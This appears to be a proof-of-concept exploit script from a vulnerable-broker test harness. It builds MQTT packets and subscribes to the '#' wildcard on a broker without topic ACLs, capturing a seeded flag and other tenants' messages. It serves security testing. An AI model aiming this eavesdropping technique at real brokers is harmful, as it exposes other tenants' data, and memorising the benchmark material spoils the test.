#!/usr/bin/env python3
"""
PoC #2: '#' wildcard subscription with no ACL -> cross-tenant eavesdropping
-----------------------------------------------------------------------------
Location: Broker._route_publish() in mqb/broker.py. Message delivery is a
pure topic-filter match (packet.topic_matches()) against every currently
subscribed client, with no per-client, per-topic, or per-tenant access
control check anywhere in the function. Any client that SUBSCRIBEs to "#"
receives every message published by every other client on the broker,
regardless of topic namespace.

The scoreable secret this PoC steals: at startup, MQB pre-seeds a RETAINED
message on a fixed, documented topic (MQB_FLAG_TOPIC, default
"fleet/control/flag") whose payload is MQB_FLAG -- a real, per-deployment
secret minted by ../generate-secrets.sh (see Broker.seed_startup_state() in
mqb/broker.py). That is exactly the same mechanism a real fleet-control
device's own retained PUBLISH would use. Per MQTT 3.1.2.4, ANY subscription
whose filter matches a retained topic gets that message delivered
immediately on SUBACK -- so an attacker that subscribes to the bare "#"
wildcard receives the seeded flag the instant it subscribes, having never
subscribed to "fleet/control/flag" specifically and never having any
relationship to whichever device/controller normally reads it.

To show this isn't limited to one lucky topic, the PoC also has two
unrelated tenants ("fleetA" and "fleetB") publish live traffic on their own
topic trees after the attacker's SUBSCRIBE -- the same "#" subscription
receives both, with zero tenant isolation. But the scored outcome is the
flag: a value the PoC itself never planted and could not have produced on
its own.

Run: python3 02_wildcard_subscribe_no_acl.py [host] [port]
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
# If a harness has configured real auth (fixing vuln #1), authenticate every
# client below so this PoC keeps testing #2 (no per-topic ACL) in isolation
# instead of false-negativing on an unrelated CONNACK rejection once #1 is
# patched.
PASSWORD = os.environ.get("MQB_REQUIREPASS")
# The fixed topic the broker seeds MQB_FLAG on at startup -- see
# Config.from_env() / Broker.seed_startup_state(). A real remote attacker
# doesn't need to know this in advance (subscribing to "#" catches it
# regardless of topic name); it's only used here to log what got captured.
FLAG_TOPIC = os.environ.get("MQB_FLAG_TOPIC", "fleet/control/flag")
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")


def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, keep_alive=30, password=None):
    flags = (clean_session & 1) << 1
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_publish(topic, payload, qos=0, retain=0, packet_id=1):
    flags = (qos & 3) << 1 | (retain & 1)
    body = _u8(topic)
    if qos > 0:
        body += struct.pack("!H", packet_id)
    body += payload
    return bytes([0x30 | flags]) + _rl(len(body)) + body


def build_subscribe(filters, packet_id=1):
    body = struct.pack("!H", packet_id)
    for f, q in filters:
        body += _u8(f) + bytes([q])
    return bytes([0x82]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    first = sock.recv(1)
    if not first:
        return None
    ptype = first[0] >> 4
    mult, val = 1, 0
    while True:
        b = sock.recv(1)[0]
        val += (b & 0x7F) * mult
        if not (b & 0x80):
            break
        mult *= 128
    body = b""
    while len(body) < val:
        chunk = sock.recv(val - len(body))
        if not chunk:
            break
        body += chunk
    return ptype, body


def drain_publishes(sock, deadline, seen):
    sock.settimeout(max(0.05, deadline - time.time()))
    while time.time() < deadline:
        try:
            r = recv_packet(sock, timeout=max(0.05, deadline - time.time()))
        except socket.timeout:
            break
        if r is None:
            break
        ptype, body = r
        if ptype == 3:  # PUBLISH
            seen.append(body)


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def main():
    _wait_for_server()

    token = uuid.uuid4().hex[:12]

    attacker = socket.create_connection((HOST, PORT), timeout=10)
    attacker.sendall(build_connect(f"poc2-attacker-{token}", password=PASSWORD))
    recv_packet(attacker)  # CONNACK
    # Attacker never publishes anything, never authenticates as any tenant,
    # and never subscribes to FLAG_TOPIC specifically -- it subscribes only
    # to the raw '#' wildcard. Per MQTT 3.1.2.4 the broker must immediately
    # deliver every retained message that matches, including the seeded flag.
    attacker.sendall(build_subscribe([("#", 0)]))
    recv_packet(attacker)  # SUBACK -- the flag delivery below rides in right after this

    secret_a = f"fleetA-secret-{token}".encode()
    secret_b = f"fleetB-secret-{token}".encode()

    pub_a = socket.create_connection((HOST, PORT), timeout=10)
    pub_a.sendall(build_connect(f"poc2-fleetA-{token}", password=PASSWORD))
    recv_packet(pub_a)
    pub_a.sendall(build_publish(f"tenants/fleetA/{token}/telemetry", secret_a, qos=0))

    pub_b = socket.create_connection((HOST, PORT), timeout=10)
    pub_b.sendall(build_connect(f"poc2-fleetB-{token}", password=PASSWORD))
    recv_packet(pub_b)
    pub_b.sendall(build_publish(f"tenants/fleetB/{token}/telemetry", secret_b, qos=0))

    seen = []
    drain_publishes(attacker, time.time() + 2.0, seen)

    for s in (attacker, pub_a, pub_b):
        s.close()

    got_a = any(secret_a in body for body in seen)
    got_b = any(secret_b in body for body in seen)
    flag_match = None
    for body in seen:
        m = FLAG_RE.search(body)
        if m:
            flag_match = m.group(0)
            break

    print(f"[*] attacker subscribed only to '#' (never to {FLAG_TOPIC!r} specifically, "
          f"never published anything itself)")
    print(f"[*] attacker received the seeded startup flag on {FLAG_TOPIC!r}: {flag_match!r}")
    print(f"[*] attacker also received unrelated fleetA/fleetB tenant traffic: "
          f"{got_a and got_b} (no tenant isolation at all)")

    if flag_match:
        print(f"[+] Confirmed: an unrelated client subscribed to '#' received the real "
              f"per-deployment secret ({flag_match.decode()}) the instant it subscribed, "
              f"via retained-message delivery, with no ACL check at all")
        return 0
    print("[-] Attacker did not receive the seeded flag via the '#' subscription")
    return 1


if __name__ == "__main__":
    sys.exit(main())
